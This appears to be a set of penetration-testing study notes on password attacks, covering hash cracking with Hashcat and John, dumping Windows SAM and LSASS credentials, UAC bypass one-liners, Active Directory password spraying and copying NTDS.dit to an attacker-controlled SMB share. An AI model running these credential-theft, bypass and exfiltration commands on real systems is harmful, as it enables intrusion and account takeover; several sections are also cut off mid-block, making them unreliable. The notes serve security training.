<summary><h1>üí° Introduction</h1></summary>

Passwords are commonly hashed when stored, in order to provide some protection in the event they fall into the hands of an attacker.

Hash functions are cryptographically designed to be one-way operations, making it computationally infeasible to derive the original input from its hashed output. When malicious actors attempt to reverse this process, it constitutes password cracking. Common methodologies include:

1. Rainbow Table Attacks

    * Leveraging precomputed hash chains for rapid lookups

2. Dictionary Attacks

    * Testing known wordlists and common password variations

3. Brute-Force Attacks

    * Systematic trial of all possible character combinations (typically last-resort)

<summary><h2>Rainbow Tables</h2></summary>

Rainbow tables represent extensive pre-generated databases that map plaintext inputs to their corresponding hash outputs for specific cryptographic algorithms. These tables enable rapid password recovery through direct hash lookup.

> Because rainbow tables are such a powerful attack, salting is used.

</details>

<details>
<summary><h2>Salt</h2></summary>

A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed.

For example, if the salt *PWN0M1C0N_* is prepended to the same password, the MD5 hash would now be as follows:

```bash
echo -n PWN0M1C0N_password123! | md5sum

# ded0e91215d34046aca709995c794045
```

**Why use a Salt?**

* Prevents Identical Hashes: Without a salt, the same password always produces the same hash. Salts ensure uniqueness, even if two users have the same password.

* Defeats Rainbow Tables: Precomputed hash tables (rainbow tables) become useless because each salt requires a separate lookup table.

**How Salts Break Rainbow Tables**

A 1-byte salt (256 possible values) forces attackers to generate 256 versions of every precomputed hash. A rainbow table with 15 billion entries would need 3.84 trillion entries (15B √ó 256) to cover all salt combinations.
Modern Systems use larger salts (e.g., 16+ bytes), making rainbow tables computationally infeasible.

</details>

<details>
<summary><h2>Dictionary attack</h2></summary>

Dictionary attacks (or wordlist attacks) represent one of the most effective password cracking methods, particularly valuable for time-constrained engagements like penetration testing.

**Key Characteristics**

* **High Efficiency:** Targets common passwords first, maximizing success rate per attempt

* **Time Optimization:** Critical for engagements with limited testing windows

* **Customization:** Wordlists can be tailored to specific industries, regions, or targets

**Common Wordlist Resources**

* [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt): Contains millions of real passwords from historical breaches

* [SecLists](https://github.com/danielmiessler/SecLists): Comprehensive security testing collection including:

    * Common credentials

    * Default passwords

    * Pattern-based variations

<summary><h2>Writing Custom Wordlists and Rules</h2></summary>

Many users create their passwords based on simplicity rather than security.

Most people tend to follow predictable patterns when creating passwords. They often:

- Use words related to the service or platform (e.g., including the company's name for work-related accounts).
- Incorporate personal interests or elements from daily life.
- Choose passwords no longer than ten characters (according to statistics provided by [WP Engine](https://wpengine.com/resources/passwords-unmasked-infographic/)).

Common sources of inspiration include:

- **Pets** ‚Äì names like "fluffy123" or "rex_the_dog"
- **Friends or Family** ‚Äì nicknames or birth years
- **Sports** ‚Äì favorite teams, player numbers, or sports terminology
- **Hobbies** ‚Äì gaming aliases, instruments, or favorite books
- **Pop culture** ‚Äì movie titles, characters, or song lyrics

Even basic OSINT (Open Source Intelligence) techniques can uncover this kind of personal information, which can be leveraged to guess or crack passwords effectively.

Commonly, users use the following additions for their password to fit the most common password policies:

| **Description**                         | **Password Syntax**     |
|----------------------------------------|--------------------------|
| First letter is uppercase              | `Password`               |
| Adding numbers                         | `Password123`            |
| Adding year                            | `Password2022`           |
| Adding month                           | `Password02`             |
| Last character is an exclamation mark  | `Password2022!`          |
| Adding special characters              | `P@ssw0rd2022!`          |

<summary><h3>Generating Wordlists using Hashcat</h3></summary>

We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations.

Each rule is written on a new line and determines how a given word should be transformed.

```bash
cat custom.rule

# :
# c
# so0
# c so0
# sa@
# c sa@
# c sa@ so0
# $!
# $! c
# $! so0
# $! sa@
# $! c so0
# $! c sa@
# $! so0 sa@
# $! c so0 sa@
```

We can use the following command to apply the rules in custom.rule to each word in password.list and store the mutated results in mut_password.list.

```bash
hashcat --force password_list.txt -r custom.rule --stdout | sort -u > custom_password_list.txt
```

In this case, each word will produce fifteen mutated variants.

```bash
cat custom_password_list.txt

# password
# Password
# passw0rd
# Passw0rd
# p@ssword
# P@ssword
# P@ssw0rd
# password!
# Password!
# passw0rd!
# p@ssword!
# Passw0rd!
# P@ssword!
# p@ssw0rd!
# P@ssw0rd!
```

<summary><h2>Cracking Protected Files</h2></summary>

Attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.

JtR has many different scripts for extracting hashes from files. We can find these scripts on our system using the following command:

```bash
locate *2john*
```

Besides standalone files, we will often run across archives and compressed files‚Äîsuch as ZIP files‚Äîwhich are protected with a password.

There are many types of [compressed files](https://fileinfo.com/filetypes/compressed). Some of the more commonly encountered file extensions include `tar`, `gz`, `rar`, `zip`, `vmdb/vmx`, `cpt`, `truecrypt`, `bitlocker`, `kdbx`, `deb`, `7z`, and `gzip`.

It is possible to extract all the extensions in a list using the following command:

```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

While many archive formats natively support password protection (e.g., ZIP, RAR), others like TAR require external encryption tools. Common solutions include `openssl` or `gpg`.

ssh2john.py SSH.private > ssh.hash
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

3. We can then view the resulting hash

```bash
john ssh.hash --show
```

<summary><h3>Cracking OpenSSL encrypted GZIP files</h3></summary>

1. To determine if a GZIP file is encrypted, we can use the following command:

```bash
file compressed_files.gzip 

# compressed_files.gzip.gzip: openssl enc'd data with salted password
```

2. To systematically attempt decryption of the file using a wordlist, execute the following one-liner:

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt);do openssl enc -aes-256-cbc -d -in <FILE> -k $i 2>/dev/null| tar xz;done
```

3. You may encounter multiple GZIP decompression warnings or errors:

```bash
# ...

# gzip: stdin: not in gzip format
# tar: Child returned status 1
# tar: Error is not recoverable: exiting now

# ...
```

Once the for loop has finished, we can check the current directory for a newly extracted file.

<summary><h3>Cracking BitLocker-encrypted drives</h3></summary>

[BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/#device-encryption) is a full-disk encryption feature developed by Microsoft for the Windows operating system.

John the Ripper (JtR) includes a utility called **bitlocker2john**, which extracts [four distinct hash types](https://openwall.info/wiki/john/OpenCL-BitLocker) from BitLocker-encrypted drives: two password-based hashes for user authentication and two recovery key hashes for backup access. We will focus on cracking the password using the first hash.

1. Extract the hashes

```bash
bitlocker2john -i backup.vhd > backup_hashes.txt
```

2. Filter the line that contains the BitLocker hash

```bash
grep "bitlocker\$0" backup_hashes.txt > backup_hash.txt
```

3. Then use JtR or Hahcat to try and crack it

**Hashcat**

```bash
hashcat -a 0 -m 22100 '<BITLOCKER_HASH>' /usr/share/wordlists/rockyou.txt
```

**John**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt
```

<summary><h4>Mounting BitLocker-encrypted drives in Windows</h4></summary>

The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the .vhd file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.

</details>

<details>
<summary><h4>Mounting BitLocker-encrypted drives in Linux (or macOS)</h4></summary>

To do this, we can use a tool called [dislocker](https://github.com/Aorimn/dislocker).

1. Install the tool

```bash
sudo apt-get install dislocker
```

2. Create two folders which we will use to mount the VHD

```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

3. Use losetup to configure the VHD as loop device

```bash
sudo losetup -f -P backup.vhd
```

4. List the devices

```bash
sudo losetup -l
```

5. List the partitions of the device

```bash
sudo fdisk -l /dev/loop0
```

6. Decrypt the drive using dislocker

```bash
sudo dislocker /dev/loop0p1 -u<PASSWORD> -- /media/bitlocker
```

7. Mount the decrypted volume

```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

8. If everything was done correctly, we can now browse the files:

```bash
cd /media/bitlockermount/
ls -la
```

<summary><h3>SSH</h3></summary>

<!-- Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The protocol implements three cryptographic primitives:

1. Symmetric Encryption

    * Uses shared secret keys (AES-256, ChaCha20, etc.) for session encryption

    * Implements Ephemeral Diffie-Hellman for secure key exchange

    * Key characteristics:

        * 128-512 bit keys (configurable)

        * Encrypts all subsequent communications

        * Common ciphers: AES-GCM, Blowfish, 3DES (deprecated)

2. Asymmetric Encryption

    * Leverages key pairs (RSA/ECDSA/Ed25519) for:

        * Host authentication

        * Key exchange initialization

    * Critical security considerations

        * Private keys should always be passphrase-protected

        * Default key locations (`~/.ssh/id_rsa`) are common attack targets

3. Hashing (HMAC)

    * Verifies message integrity via SHA-2/SHA-3 algorithms

    * Prevents replay attacks and tampering -->

We can use a tool like **Hydra** to brute force SSH. This is covered in-depth in the [LOGIN BRUTE FORCING](./13-login-brute-forcing.md) module.

Password spraying is a credential-based attack where a single password is tested against multiple user accounts before moving to the next password. 

This technique:

* Avoids account lockouts by spacing attempts

* Exploits weak organizational password policies

<summary><h3>Default credentials</h3></summary>

Network infrastructure devices and enterprise software frequently ship with factory-set credentials, creating critical exposure when left unmodified during deployment.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

Install

```bash
pip3 install defaultcreds-cheat-sheet

Once installed, we can use the creds command to search for known default credentials associated with a specific product or vendor.

```bash
creds search <KEYWORD>
```

Example:

```bash
creds search linksys --export

<summary><h1>ü™ü Extracting Passwords from Windows Systems</h1></summary>

<details>
<summary><h2>Attacking SAM, SYSTEM, and AUTHORITY</h2></summary>

With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target.

<details>
<summary><h3>Registry Hives</h3></summary>

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.

| Registry Hive   | Description |
|----------------|-------------|
| `HKLM\SAM`     | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords. |
| `HKLM\SYSTEM`  | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes. |
| `HKLM\SECURITY`| Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

</details>

1. **Use reg.exe to save copies of the registry hives *(requires launching cmd.exe with administrative privileges)***

    **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save'

    ```cmd
    reg.exe save hklm\sam %USERPROFILE%\Desktop\sam.save
    ```

    **Target Machine:** Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save'

    ```cmd
    reg.exe save hklm\system %USERPROFILE%\Desktop\system.save
    ```

    **Target Machine:** Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save'

    ```cmd
    reg.exe save hklm\security %USERPROFILE%\Desktop\security.save
    ```

    After saving the registry hives offline, we can transfer them to our attack host using several methods. In this example, we'll use Impacket's smbserver along with basic CMD commands to copy the hive files to a shared folder hosted on the attacker machine.

2. Transfer the files from the target machine to the attack machine

    **Attack Machine:** Create a share with smbserver

    ```bash
    mkdir ~/winhives
    sudo smbserver.py -smb2support share ~/winhives
    ```

    **Target Machine:** Transfer the hive copies to the share

    ```bash
    C:\> move sam.save \\<ATTACKER_IP>\share
    ```

    ```bash
    C:\> move security.save \\<ATTACKER_IP>\share
    ```

    ```bash
    C:\> move system.save \\<ATTACKER_IP>\share
    ```

3. **Dump the hashes with secretsdump**

    **Attack Machine:** Run [`secretsdump.py`](../scripts/passwords/secretsdump.py) with Python and specify each of the hive files we retrieved from the target host.

    ```bash
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```

    Notice the following line:

    ```bash
    # Dumping local SAM hashes (uid:rid:lmhash:nthash)
    ```

    This tells us how to interpret the output and which hashes we can attempt to crack. 
    
    With this in mind, we can extract the NT hashes for each user account into a text file and begin the password cracking process. Keeping track of which hash belongs to which user is helpful for organizing and interpreting the results.

    > **NOTE:** The first step secretsdump performs is retrieving the system bootkey, which is required to decrypt the local SAM hashes. This is because the bootkey is used to encrypt and decrypt the SAM database. Without access to it, the hashes cannot be decrypted‚Äîmaking it essential to have copies of the relevant registry hives, as previously discussed.

4. **Crack the hashes with Hashcat**

    **Attack Machine:** Populate a text file with the NT hashes we were able to dump

    ```bash
    cat windowshashes.txt

    31d6cfe0d16ae931b73c59d7e0c089c0
    c02478537b9727d391bc80011c2e2321
    58a478135a93ac3bf058a5ea0e8fdb71
    ```

    **Attack Machine:** Run Hashcat against NT hashes

    ```bash
    sudo hashcat -m 1000 windowshashes.txt /usr/share/wordlists/rockyou.txt
    ```

    Obtaining these passwords can be valuable in several ways. For instance, the cracked credentials might allow us to access other systems on the network‚Äîespecially since password reuse across different work or personal accounts is common. Understanding and applying this technique is particularly useful during assessments and can be leveraged whenever we compromise a vulnerable Windows system and obtain administrative privileges to dump the SAM database.

<details>
<summary><h3>DCC2 hashes</h3></summary>

As previously mentioned, `HKLM\SECURITY` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed representations of network credentials. 

**Example hash**

```
exampledomain.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

**Run Hashcat against NT hashes**

```bash

* Cache credentials locally in memory
* Create [access tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Enforce security policies
* Write to Windows' [security log](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

Before extracting credentials from LSASS, it's wise to first create a memory dump of the LSASS process. This allows us to analyze its contents offline from our attack host. Performing the attack offline provides greater flexibility‚Äîenabling faster processing and reducing the time spent on the target system, which helps minimize detection risk.

<details>
<summary><h4>Dumping LSASS process memory</h4></summary>

<details>
<summary><h5>Task Manager method</h5></summary>

With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

1. Open Task Manager
2. Select the Processes tab
3. Find and right click the Local Security Authority Process
4. Select Create dump file
5. A file called `lsass.DMP` is created and saved in `%temp%`.

This is the file we will transfer to our attack host. 

</details>

<details>
<summary><h5>Rundll32.exe & Comsvcs.dll method</h5></summary>

The Task Manager method for dumping LSASS memory requires a GUI-based interactive session with the target, which isn't always available. As an alternative, we can use the command-line utility `rundll32.exe` to dump LSASS memory.

> **NOTE:** Modern antivirus solutions typically flag this technique as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

**Finding LSASS's PID in cmd**

```cmd
tasklist /svc
```

Expected output

```cmd
Image Name                     PID Services
========================= ======== ============================================
...
lsass.exe                      672 KeyIso, SamSs, VaultSvc
...
```

**Finding LSASS's PID in PowerShell**

```powershell
Get-Process lsass
```

Expected output

```cmd
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

**Creating a dump file using PowerShell *(with an elevated PowerShell session)***

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). 

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack host to attempt to extract any credentials that may have been stored in LSASS process memory.

</details>

</details>

<details>
<summary><h4>Using Pypykatz to extract credentials</h4></summary>

Once the dump file is transferred to our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials directly from the .dmp file.

**Install**

```bash
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
sudo python3 setup.py install
```

At the time of writing, Mimikatz only runs on Windows systems. This means we‚Äôd either need a Windows-based attack host or run Mimikatz directly on the target‚Äîan approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.

When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.

**Running Pypykatz**

```bash
pypykatz lsa minidump ./lsass.DMP
```

**Output**

MSV

```bash
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that the Local Security Authority (LSA) uses to validate logon attempts against the SAM database. In this case, pypykatz extracted details from the `bob` user account's logon session stored in LSASS memory‚Äîincluding the SID, username, domain, and both the NT and SHA1 password hashes.

WDIGEST

```bash
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

WDIGEST is an older authentication protocol that was enabled by default in Windows XP through Windows 8, as well as Windows Server 2003 through 2012. When enabled, LSASS caches WDIGEST credentials in **clear-text**, meaning that if we target a system with WDIGEST active, there's a high chance of retrieving a plaintext password. However, in modern Windows versions, WDIGEST is **disabled by default** to mitigate this risk.

Kerberos

```bash
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by **Active Directory** in Windows domain environments. When a domain user authenticates, they are issued tickets that allow access to authorized network resources without re-entering credentials. LSASS stores Kerberos-related data such as passwords, encryption keys (ekeys), tickets, and PINs in memory. This makes it possible to extract these artifacts from LSASS and use them to access other systems within the same domain.

DPAPI

```bash
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz and pypykatz can extract DPAPI master keys for logged-on users whose data resides in LSASS process memory. These master keys can then be used to decrypt secrets stored by various applications that rely on DPAPI, potentially revealing credentials for multiple accounts. DPAPI attack techniques are explored in greater depth in the [WINDOWS PRIVILEGE ESCALATION](./23-windows-privilege-escalation.md) module.

**Cracking the NT Hash with Hashcat**

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

<summary><h2>Attacking Windows Credential Manager</h2></summary>

Introduced in Windows 7/Server 2008 R2, Credential Manager serves as a proprietary vault for storing authentication details (domain, web, and application credentials) in encrypted form. While Microsoft's internal workings remain undocumented, research reveals credentials are stored in protected locations:

* `%USERPROFILE%\AppData\Local\Microsoft\Vault\`
* `%USERPROFILE%\AppData\Local\Microsoft\Credentials\`
* `%USERPROFILE%\AppData\Roaming\Microsoft\Vault\`
* `%ProgramData%\Microsoft\Vault\`
* `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).

<details>
<summary><h3>Windows Vault and Credential Manager</h3></summary>

Microsoft often refers to the protected credential stores as Credential Lockers (previously known as Windows Vaults). While Credential Manager serves as the user-facing interface and API, the actual credentials are stored in encrypted vault or locker folders on the system.The following table lists the two types of credentials Windows stores:

| Name                | Description |
|---------------------|-------------|
| **Web Credentials** | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge. |
| **Windows Credentials** | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |

**Exporting credentials**

It is possible to export Windows Vaults to .crd files either via Control Panel or with the following command:

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

</details>

<details>
<summary><h3>Enumerating credentials with cmdkey</h3></summary>

We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:

If you're using xFreeRDP, you can share [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master) with the remote system by mounting a local folder as a shared drive:

```bash
xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>' /drive:share,/home/<USER>/mimikatz
```

> This command maps the local /home/<USER>/mimikatz directory to a drive named share on the remote desktop session, allowing easy access to the Mimikatz binaries from within the RDP environment.

1. **Verify the current user**

```cmd
whoami
```

2. **Enumerate the credentials**

```cmd
cmdkey /list
```

Expected output

Currently stored credentials:

```cmd
Target: WindowsLive:target=virtualapp/didlogical
Type: Generic
User: 02hejubrtyqjrkfi
Local machine persistence

Target: Domain:interactive=SRV01\herman
Type: Domain Password
User: SRV01\herman
```

Stored credentials are listed with the following format:

| Key          | Value Description |
|--------------|-------------------|
| **Target**   | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier. |
| **Type**     | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons. |
| **User**     | The user account associated with the credential. |
| **Persistence** | Indicates whether a credential is saved persistently on the computer. Credentials marked with `Local machine` persistence survive reboots. |

3. **Use runas to impersonate the stored user like so**

```cmd
runas /savecred /user:SRV01\herman cmd
```

4. **UAC Bypass Techniques**

Option 1: FodHelper Exploit

```cmd
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
```

Option 2: ComputerDefaults Exploit 

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

5. **Navigating to Administrator Profile**

```cmd
cd C:\Users\Administrator
```

6. **Clear registry modifications post-exploitation**

```cmd
reg delete HKCU\Software\Classes\ms-settings /f
```

<summary><h2>Attacking Active Directory and NTDS.dit</h2></summary>

Active Directory (AD) serves as the foundational directory service in over 90% of enterprise Windows environments, managing identity, access, and policy across networked systems.

In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.

<details>
<summary><h3>Dictionary attacks against AD accounts using NetExec</h3></summary>

When a dictionary attack is appropriate, tailoring it to the target organization can improve results. Searching social media and the company‚Äôs website for employee directories can help identify staff names. Since most employees receive a username early on‚Äîand many organizations follow common naming conventions‚Äîthis information can guide our attack.

> **NOTE:** Conducting these attacks over the network can be quite noisy and easy to detect, as they often generate significant network traffic and trigger alerts on the target system. Additionally, repeated login attempts may be blocked due to Group Policy restrictions, such as account lockout policies.

Here are a few typical patterns to consider:


| **Username Convention**           | **Practical Example for Jane‚ÄØJill‚ÄØDoe** |
| --------------------------------- | --------------------------------------- |
| firstinitiallastname              | jdoe                                    |
| firstinitialmiddleinitiallastname | jjdoe                                   |
| firstnamelastname                 | janedoe                                 |
| firstname.lastname                | jane.doe                                |
| lastname.firstname                | doe.jane                                |
| nickname                          | doedoehacksstuff                        |

Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@domain.com, we can infer that jdoe is the username.

<details>
<summary><h4>Advice: OSINT-Driven Username Enumeration Techniques</h4></summary>

A common tactic for discovering corporate username formats involves leveraging publicly available information through strategic searches:

1. **Email Discovery via Search Engines**

Querying `@exampledomain.com` on Google often reveals valid email formats from:

* Employee directories
* Press releases
* Conference attendee lists
* GitHub commits (if corporate emails are exposed)

2. **Social Media Scraping**

Tools like LinkedIn Scraper or theHarvester can correlate names/roles with email patterns.

3. **Document Metadata Analysis**

Search `site:exampledomain.com filetype:pdf` to find:

* Author fields in PDF properties (often contains internal usernames)
* Watermarks in internal docs

</details>

<details>
<summary><h4>Creating a custom list of usernames</h4></summary>

After gathering employee names from OSINT research (e.g., LinkedIn, company websites), create a formatted username list for spraying attacks. For this demonstration, we‚Äôll use a small sample set:

* Ben Williamson  
* Bob Burgerstien  
* Jim Stevenson  
* Jill Johnson  
* Jane Doe  

```bash
nano ~/names.txt
```

We can create a custom list using an automated list generator such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.

**Install**

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
chmod +x username-anarchy
```

**Usage**

```bash
./username-anarchy -i ~/names.txt > ~/usernames.txt
```

> While automated tools accelerate list generation, investing time in identifying an organization‚Äôs exact username convention significantly improves attack success rates.

</details>

<details>
<summary><h4>Enumerating valid usernames</h4></summary>

Before initiating password-based attacks, verifying username validity prevents wasted effort on non-existent accounts. Kerbrute streamlines this process.

**Install**

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/
```

**Usage**

```bash
kerbrute userenum --dc <DC IP> -d exampledomain.local ~/usernames.txt
```

Example output

```bash
# ...
# 2025/04/25 09:17:10 >  Using KDC(s):
# 2025/04/25 09:17:10 >   <DC IP>:<PORT>

# 2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@exampledomain.local
# ...
```

</details>

<details>
<summary><h4>Launching a brute-force attack</h4></summary>

Once we've identified the naming convention and gathered employee names or prepared a username list, we can launch a brute-force attack against the target Domain Controller using a tool like NetExec. By leveraging the SMB protocol, we can send logon attempts directly to the DC. 

**Option 1: crackmapexec**

Wordlist

```bash
crackmapexec smb <DC IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt | grep "+"
```

Username

```bash
crackmapexec smb <DC IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+"
```

**Option 2: netexec**

**Usage**

```bash
netexec smb <DC IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Example output

```bash
# SMB         <DC IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)

# SMB         <DC IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd! 
```

In this example, NetExec uses SMB to attempt a login as user bwilliamson (-u) with a password list (-p) of common passwords located at `/usr/share/wordlists/fasttrack.txt`. Be aware that if an account lockout policy is in place, this attack could lock the targeted account.

> **NOTE:** Understanding what artifacts an attack leaves behind is key to providing impactful remediation advice. On any Windows system, administrators can use Event Viewer to review Security logs and examine recorded actions. This insight can guide the implementation of stronger security controls and support post-breach investigations.

Once credentials are obtained, we can attempt to gain remote access to the Domain Controller and extract the `NTDS.dit` file, which contains password hashes for all domain users.

</details>

</details>

<details>
<summary><h3>Capturing NTDS.dit</h3></summary>

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. The `NTDS.dit` file, located at `%systemroot%\NTDS` on domain controllers, is the core database of Active Directory‚Äî‚Äú.dit‚Äù stands for Directory Information Tree. This file contains all domain usernames, password hashes, and critical schema data. If an attacker captures it, they could potentially compromise every account in the domain.

We have two options to obtain this file:

Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.

*Evil-WinRM* PS C:\> net localgroup
```

We also will want to check what domain privileges we have.

```bash
*Evil-WinRM* PS C:\> net user <USERNAME>
```

We're checking whether the account has administrative privileges. To copy the `NTDS.dit` file, the account must have local administrator (Administrators group) or domain administrator (Domain Admins group) ‚Äî or equivalent ‚Äî privileges.

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the `NTDS.dit` file.

</details>

<details>
<summary><h5>Creating shadow copy of C:</h5></summary>

We can use vssadmin to create a [Volume Shadow Copy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.

```bash
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

Expected output

```bash
# vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
# (C) Copyright 2001-2013 Microsoft Corp.

# Successfully created shadow copy for 'C:\'
#     Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
#     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

> It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.

> We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down.

</details>

<details>
<summary><h5>Copying NTDS.dit from the VSS</h5></summary>

We can then copy the `NTDS.dit` file from the volume shadow copy of the C: drive to another location on the system, preparing it for transfer to our attack host.

```bash
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Then, transfer the files from the target machine to the attack machine

**Attack Machine:** Create a share with smbserver

```bash
mkdir ~/ntds
sudo smbserver.py -smb2support share ~/ntds
```

**Target Machine:** Transfer the hive copies to the share

```bash
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER IP>\share 
```

</details>

<details>
<summary><h5>Extracting hashes from NTDS.dit</h5></summary>

With a copy of NTDS.dit on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's secretsdump:

```bash
cd ~/ntds
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.

</details>

</details>

</details>

<details>
<summary><h3>Cracking hashes and gaining credentials</h3></summary>

In many of the techniques we've covered, we've successfully cracked the hashes we've obtained.

```bash
